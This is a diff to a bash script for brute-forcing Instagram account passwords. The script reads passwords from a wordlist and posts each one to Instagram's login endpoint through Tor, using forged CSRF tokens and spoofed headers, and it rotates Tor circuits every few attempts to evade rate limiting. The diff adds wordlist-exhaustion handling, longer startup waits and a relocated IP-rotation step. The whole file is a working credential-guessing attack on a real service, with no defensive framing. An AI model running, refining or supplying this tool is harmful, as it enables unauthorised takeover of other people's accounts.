@@ -5,8 +5,9 @@ echo "Run it with su or sudo ";
 exit 0;
 fi
 echo "Booting up Tor...";
+killall tor &>/dev/null;
 (tor --SOCKSPort 9050 1>/dev/null) &
-sleep 10s;
+sleep 25s;
 echo "Ok...";
 token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33);
 rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11);
@@ -28,27 +29,30 @@ sedline=$line_counter'q;d';
 line=$(sed $sedline "$2");
 echo "Trying $line_counter of $size";
 while :
+if [[ "$line_counter" -gt "$size" ]]; then
+echo "Password not in wordlist";
+exit 0;
+fi
 do
 curl --socks5-hostname 127.0.0.1:9050 -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$1&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed 1>response.txt "$url" 2>/dev/null;
 response=$(cat response.txt);
-if [[ $((progressive%4)) == 0 ]]; then
-progressive=0;
-killall -HUP tor;
-sleep 2;
-token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33);
-rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11);
-fi
 if [[ $response == *'authenticated":true'* ]]; then
  echo "The Password is $line";
  exit 0;
 fi
-if [[ $response == *'authenticated":false'* ]]; 
-then
+if [[ $response == *'authenticated":false'* ]]; then
  line_counter=$((line_counter+1));
  sedline=$line_counter'q;d';
  line=$(sed $sedline "$2");
  progressive=$((progressive+1));
  echo "Trying $line_counter of $size";
+  if [[ $((progressive%4)) == 0 ]]; then
+  progressive=0;
+  killall -HUP tor;
+  sleep 2;
+  token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33);
+  rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11);
+  fi
 else
 killall -HUP tor;
 sleep 2;
